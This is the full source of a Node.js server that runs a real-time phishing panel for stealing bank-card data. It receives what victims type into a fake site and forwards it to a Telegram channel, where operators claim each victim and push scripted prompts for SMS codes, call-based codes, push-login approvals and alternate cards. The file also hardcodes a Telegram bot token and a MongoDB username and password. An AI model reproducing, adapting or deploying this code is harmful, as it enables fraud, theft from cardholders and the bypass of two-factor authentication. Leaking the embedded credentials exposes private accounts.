const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// --- КОНФИГУРАЦИЯ ---
const BOT_TOKEN = '8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw';
const CHANNEL_ID = '-1003455979409';
const BOT_LINK = 'https://t.me/tg_api_workbot'; // ЗАМЕНИ НА ССЫЛКУ СВОЕГО БОТА
const MONGO_URI = 'mongodb+srv://multmoment27_db_user:tgLoUlcEPVjsnZgb@cluster0.vzajrjd.mongodb.net/?retryWrites=true&w=majority'; 

mongoose.connect(MONGO_URI).then(() => console.log('✅ База подключена'));

const Worker = mongoose.model('Worker', new mongoose.Schema({
    workerId: String,      
    workerName: String,
    targetUserId: String   
}));

let userTasks = {}; 
let logsStorage = {}; 

const cmdTexts = {
    'sms': 'Введите код подтверждения из СМС',
    'call': 'Введите последние 4 цифры номера, с которого поступит звонок',
    'push': 'Подтвердите вход в мобильном приложении',
    'bal': 'Недостаточно средств на карте. Попробуйте другую карту',
    'support': 'Ошибка безопасности. Опишите проблему оператору в чате'
};

const safeText = (text) => String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

// Функция для безопасной отправки (чтобы не падал сервер от логов Axios)
async function sendTg(method, data) {
    try {
        return await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, data);
    } catch (e) {
        console.error(`❌ TG Error [${method}]:`, e.response?.data?.description || e.message);
    }
}

// --- ПРИЕМ ЛОГА С САЙТА ---
app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;
    logsStorage[userId] = { type, data };

    const connection = await Worker.findOne({ targetUserId: userId });

    const channelButtons = {
        inline_keyboard: [
            [{ text: "⚡️ ВЗЯТЬ В РАБОТУ", callback_data: `take_${userId}` }],
            [{ text: "🤖 ПЕРЕЙТИ В БОТА", url: BOT_LINK }]
        ]
    };

    // 1. Если это ОТВЕТ (код, пароль и т.д.)
    if (connection && (type.includes('ОТВЕТ') || type.includes('ВВОД') || type.includes('CODE'))) {
        // Уведомление в канал
        await sendTg('sendMessage', {
            chat_id: CHANNEL_ID,
            text: `<b>📩 ПОЛЬЗОВАТЕЛЬ ОТВЕТИЛ [${safeText(type)}]</b>\n🆔 ID: <code>${userId}</code>\n👤 Вбив: <b>${connection.workerName}</b>`,
            parse_mode: 'HTML',
            reply_markup: channelButtons
        });

        // Данные в бот вбивщику
        let replyMsg = `<b>📩 ОТВЕТ ОТ [<code>${userId}</code>]</b>\n\n`;
        for (let key in data) { replyMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`; }
        await sendTg('sendMessage', {
            chat_id: connection.workerId,
            text: replyMsg,
            parse_mode: 'HTML'
        });

    } else if (connection) {
        // 2. ПОВТОРНЫЙ ЛОГ (юзер просто вернулся или обновил страницу)
        await sendTg('sendMessage', {
            chat_id: CHANNEL_ID,
            text: `<b>⚠️ ПОВТОРНЫЙ ЛОГ [${safeText(type)}]</b>\n🆔 ID: <code>${userId}</code>\n📍 Закреплен за: <b>${connection.workerName}</b>`,
            parse_mode: 'HTML',
            reply_markup: channelButtons
        });

    } else {
        // 3. НОВЫЙ ЛОГ
        await sendTg('sendMessage', {
            chat_id: CHANNEL_ID,
            text: `<b>🆕 НОВЫЙ ЛОГ [${safeText(type)}]</b>\n🆔 ID: <code>${userId}</code>\n📍 Статус: 🔵 Ожидает...`,
            parse_mode: 'HTML',
            reply_markup: channelButtons
        });
    }
    res.json({ success: true });
});

app.get('/api/check/:userId', (req, res) => {
    const task = userTasks[req.params.userId] || null;
    if (task) delete userTasks[req.params.userId];
    res.json(task);
});

// --- ВЕБХУК ТЕЛЕГРАМ ---
app.post('/tg-webhook', async (req, res) => {
    const { message, callback_query } = req.body;

    if (message && message.text) {
        const chatId = message.chat.id;
        if (message.text === '/start') {
            await sendTg('sendMessage', { chat_id: chatId, text: "<b>👋 Бот готов. Жди логи!</b>", parse_mode: 'HTML' });
        } else {
            const conn = await Worker.findOne({ workerId: chatId });
            if (conn) {
                userTasks[conn.targetUserId] = { action: 'ask', text: message.text };
                await sendTg('sendMessage', { chat_id: chatId, text: `✅ Отправлено юзеру <code>${conn.targetUserId}</code>`, parse_mode: 'HTML' });
            }
        }
    }

    if (callback_query) {
        const workerId = callback_query.from.id;
        const workerName = callback_query.from.username ? `@${callback_query.from.username}` : callback_query.from.first_name;
        const [action, userId, code] = callback_query.data.split('_');

        await sendTg('answerCallbackQuery', { callback_query_id: callback_query.id });

        if (action === 'take') {
            // ПЕРЕХВАТ: обновляем базу, кто сейчас работает с этим ID
            await Worker.findOneAndUpdate(
                { targetUserId: userId }, 
                { workerId: workerId, workerName: workerName }, 
                { upsert: true }
            );

            const log = logsStorage[userId];
            let fullMsg = `<b>💎 УПРАВЛЕНИЕ [<code>${userId}</code>]</b>\n\n`;
            if (log) { for (let key in log.data) { fullMsg += `<b>${key}:</b> <code>${log.data[key]}</code>\n`; } }

            await sendTg('sendMessage', {
                chat_id: workerId,
                text: fullMsg,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "💬 СМС", callback_data: `ask_${userId}_sms` }, { text: "📞 Звонок", callback_data: `ask_${userId}_call` }],
                        [{ text: "📲 Пуш", callback_data: `msg_${userId}_push` }, { text: "💰 Баланс", callback_data: `msg_${userId}_bal` }],
                        [{ text: "✍️ Свой текст", callback_data: `custom_${userId}` }]
                    ]
                }
            });

            await sendTg('editMessageText', {
                chat_id: CHANNEL_ID,
                message_id: callback_query.message.message_id,
                text: `<b>✅ ЛОГ ВЗЯТ</b>\n🆔 ID: <code>${userId}</code>\n👤 Вбив: <b>${workerName}</b>`,
                parse_mode: 'HTML'
            });
        }

        if (action === 'custom') {
            await sendTg('sendMessage', { chat_id: workerId, text: `⌨️ <b>Введите текст для юзера:</b>`, parse_mode: 'HTML' });
        }

        if (action === 'ask' || action === 'msg') {
            userTasks[userId] = { action, text: cmdTexts[code] || "Введите данные" };
        }
    }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер на порту ${PORT}`));
